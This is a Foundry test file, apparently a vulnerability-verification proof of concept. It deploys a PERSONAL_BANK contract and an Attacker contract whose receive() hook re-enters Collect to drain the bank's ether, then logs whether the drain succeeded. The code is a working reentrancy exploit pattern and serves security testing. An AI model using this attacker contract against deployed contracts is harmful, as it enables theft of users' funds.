// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol";

contract BankReentrancyTest is Test {
    PERSONAL_BANK public bank;
    LogFile public logFile;
    Attacker public attacker;
    
    function setUp() public {
        // Deploy contracts
        logFile = new LogFile();
        bank = new PERSONAL_BANK();
        
        // Configure bank
        bank.SetLogFile(address(logFile));
        bank.SetMinSum(0);
        
        // Fund the bank to simulate existing funds
        vm.deal(address(bank), 10 ether);
        
        // Create attacker
        attacker = new Attacker(payable(address(bank)));
    }

    function testReentrancyVulnerability() public {
        // Provide funds to attacker for deposit
        vm.deal(address(attacker), 1 wei);
        uint256 initialBankBalance = address(bank).balance;

        console.log("--- BEFORE-Trigger Attack ---");
        uint256 beforeAttackBankBalance = address(bank).balance;
        uint256 beforeAttackAttackerBalance = address(attacker).balance;
        console.log("Bank balance before attack: %s wei", beforeAttackBankBalance);
        console.log("Attacker balance before attack: %s wei", beforeAttackAttackerBalance);

        console.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack();
        console.log("Attack completed");
        
        console.log("--- AFTER-Trigger Attack ---");
        uint256 afterAttackBankBalance = address(bank).balance;
        uint256 afterAttackAttackerBalance = address(attacker).balance;
        console.log("Bank balance after attack: %s wei", afterAttackBankBalance);
        console.log("Attacker balance after attack: %s wei", afterAttackAttackerBalance);
        
        // Compare balances to verify exploitation
        bool bankDrained = afterAttackBankBalance == 0;
        bool attackerProfited = afterAttackAttackerBalance > beforeAttackAttackerBalance + initialBankBalance - 1 wei;
        bool vulnerabilityExploited = bankDrained && attackerProfited;
        console.log("Differential results:");
        console.log("- Bank drained: %s", bankDrained ? "YES (0 ETH)" : "NO");
        console.log("- Attacker profited: %s (Gained %s wei)", attackerProfited ? "YES" : "NO", afterAttackAttackerBalance - beforeAttackAttackerBalance);
        
        // Final verdict
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained the bank and transferred funds to attacker");
        } else {
            console.log("Vulnerability not Exist: Attack did not drain bank and/or attacker profits were insufficient");
        }
    }
}

contract Attacker {
    PERSONAL_BANK public bank;
    uint256 private reentrancyCount;
    
    constructor(address payable _bank) payable {
        bank = PERSONAL_BANK(_bank);
    }
    
    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            bank.Collect(1 wei);
        }
    }
    
    function attack() public {
        bank.Deposit{value: 1 wei}();
        reentrancyCount = 0;
        bank.Collect(1 wei);
        bank.Collect(address(bank).balance);
    }
    
    fallback() external payable {}
}